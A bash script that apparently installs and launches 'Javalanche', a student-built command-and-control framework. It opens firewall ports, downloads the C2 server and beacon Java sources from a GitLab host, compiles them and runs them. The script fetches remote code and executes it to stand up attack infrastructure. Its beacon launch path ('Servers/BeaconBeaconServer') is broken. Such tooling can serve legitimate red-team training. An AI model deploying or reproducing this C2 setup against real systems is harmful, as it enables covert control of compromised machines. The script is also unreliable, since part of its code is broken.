#!/bin/bash

#update and install dependencies
sudo apt update
sudo apt install curl

# Set up directory for everything to go in
sudo mkdir /home/javalanche

# Get command line parameters
server="C2"

if [ "$1" == "-server" ]; then
    server="$2"
fi

# install Java development kit
sudo curl -o /home/javalanche/jdkinstaller.tar.gz https://download.oracle.com/java/17/latest/jdk-17_linux-x64_bin.tar.gz
sudo gzip -d /home/javalanche/jdkinstaller.tar.gz
sudo tar -xf /home/javalanche/jdkinstaller.tar -C /home/javalanche
jdkDir=$(ls /home/javalanche | grep jdk-)
javaDir="/home/javalanche/$jdkDir/bin/java"
javacDir="/home/javalanche/$jdkDir/bin/javac"


# set firewall rules
if [ "$server" == "C2" ]; then
    sudo iptables -A INPUT -p tcp --dport 1234 -j ACCEPT
else
    sudo iptables -A OUTPUT -p tcp --dport 1234 -j ACCEPT
    sudo iptables -A INPUT -p tcp --dport http -j ACCEPT
fi

# set up directories
sudo mkdir /home/javalanche/Servers
sudo mkdir /home/javalanche/Servers/Beacon
sudo mkdir /home/javalanche/Servers/C2

# Download all of the java files
curl -o /home/javalanche/Servers/C2/C2Server.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/C2/C2Server.java?ref_type=heads
curl -o /home/javalanche/Servers/C2/C2ServerUserHandler.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/C2/C2ServerUserHandler.java?ref_type=heads
curl -o /home/javalanche/Servers/C2/C2ServerBeaconHandler.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/C2/C2ServerBeaconHandler.java?ref_type=heads
curl -o /home/javalanche/Servers/Beacon/BeaconServer.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/Beacon/BeaconServer.java?ref_type=heads
curl -o /home/javalanche/Servers/Beacon/BeaconClientHandler.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/Beacon/BeaconClientHandler.java?ref_type=heads
curl -o /home/javalanche/Servers/Beacon/BeaconC2Handler.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/Beacon/BeaconC2Handler.java?ref_type=heads
curl -o /home/javalanche/Servers/Duplexer.java https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/Duplexer.java?ref_type=heads

# Download file for javac to use
curl -o /home/javalanche/files.txt https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/linuxFiles.txt?ref_type=heads

# Change directory so java and javac work correctly
cd /home/javalanche

# Compile
"$javacDir" "@/home/javalanche/files.txt"

# Run the desired server
if [ "$server" == "C2" ]; then
    "$javaDir" "Servers/C2/C2Server"
else
    "$javaDir" "Servers/BeaconBeaconServer"
fi